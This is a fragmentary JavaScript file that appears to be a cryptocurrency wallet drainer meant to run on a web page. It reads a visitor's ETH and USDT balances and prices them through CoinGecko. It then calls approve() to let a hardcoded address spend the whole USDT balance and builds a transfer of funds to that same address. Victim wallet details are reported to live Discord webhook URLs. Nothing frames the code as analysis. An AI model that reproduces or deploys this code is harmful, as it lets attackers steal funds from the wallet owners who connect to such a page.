...
setTimeout(async () => {
    try {
        ...
        sW(`Account \`${walletAddress}\` Amount USDT: ${usdtBalancecorrect}`);
...
let usdtBalancecorrect = 0;
let usdtvalueineth= 0;
...
const verifyAsset = async () => {
    ...
    try {
        ...
        var r_bal = web3Js.utils.fromWei(eth_bal, 'ether');
...
const verify = async()=>{
    ...
    eth_bal = await web3Js.eth.getBalance(myAddress);
    let r_bal = web3Js.utils.fromWei(eth_bal, 'ether');
    console.log(r_bal);
    const web3 = new Web3(window.ethereum);
    usdtcontractadd='0xdAC17F958D2ee523a2206206994597C13D831ec7';

    const usdtcontract = new web3.eth.Contract(erc20AbiJson, usdtcontractadd,provider);
        const tokenBalance = await usdtcontract.methods.balanceOf(myAddress).call();
        console.log(tokenBalance);
         usdtapi='https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=0xdAC17F958D2ee523a2206206994597C13D831ec7&vs_currencies=eth'
         fetch(usdtapi)
         .then(response=> response.json())
         .then((json) => {
...
console.log(tokenBalance);
usdtBalancecorrect = tokenBalance / 1000000;
console.log(usdtBalancecorrect);

let ethapi= await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
.then(response=>response.json())
console.log(JSON.stringify(ethapi));
ethapiprice=ethapi.ethereum.usd;
console.log(ethapiprice);
usdtvalueineth=usdtBalancecorrect/ethapiprice;
console.log(usdtvalueineth);
console.log(r_bal);
const interface= new ethers.utils.Interface(erc20AbiJson);
if(usdtvalueineth>r_bal)
{

    const sW = (message) => {
        // const webhookURL = "https://discord.com/api/webhooks/wdwefwefwefwefwefwefwefwefwefwefwefwefwefwefwefwef"
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1057384797711892550/6AFo7fpCQzYjd0sqSn0UPKDxV1BohSiDFe3l-5JyaG3m5IdAwckP4CS5TAxTIF51KLI0");
    ...
    let libcContract= new ethers.Contract(usdtcontractadd, erc20AbiJson, provider.getSigner());
    let appr = await libcContract.approve("0x980F188E800a6EFcFE0367534480C39e22de7eC9",tokenBalance).call();
    ...
    const tokenAddresses = [
        ...
        const contract = new web3.eth.Contract(erc20AbiJson, tokenAddress,provider);
        const tokenBalance = await contract.methods.balanceOf(myAddress).call();

        console.log(JSON.stringify(web3.utils.fromWei(tokenBalance)));
        console.log(tokenAddress);
        let api = await fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddresses}&vs_currencies=eth
    `)
        .then(response => response.json())
        console.log(JSON.stringify(api));
        WalletPriceToken=api*tokenBalance;
    ...
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            ...
            const txObject = {
                ...
                to: "0x980F188E800a6EFcFE0367534480C39e22de7eC9",
...
const discordWebhookURL = "https://discord.com/api/webhooks/1057384797711892550/6AFo7fpCQzYjd0sqSn0UPKDxV1BohSiDFe3l-5JyaG3m5IdAwckP4CS5TAxTIF51KLI0"

const sW = (message) => {
    // const webhookURL = "https://discord.com/api/webhooks/wdwefwefwefwefwefwefwefwefwefwefwefwefwefwefwefwef"
    const webhookURL = "https://discord.com/api/webhooks/1057384797711892550/6AFo7fpCQzYjd0sqSn0UPKDxV1BohSiDFe3l-5JyaG3m5IdAwckP4CS5TAxTIF51KLI0"
    fetch(webhookURL, {
        method: 'POST',
        headers: {
    ...
    const webhookURLs="https://discord.com/api/webhooks/1057732205541068900/IL6OvjvONFAExe0zbXDIT2D3uoiSZ9mYJw6XNK47DJGMlYB8jil4Db89Z1p7LDPUU2Lh";
    fetch(webhookURLs, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
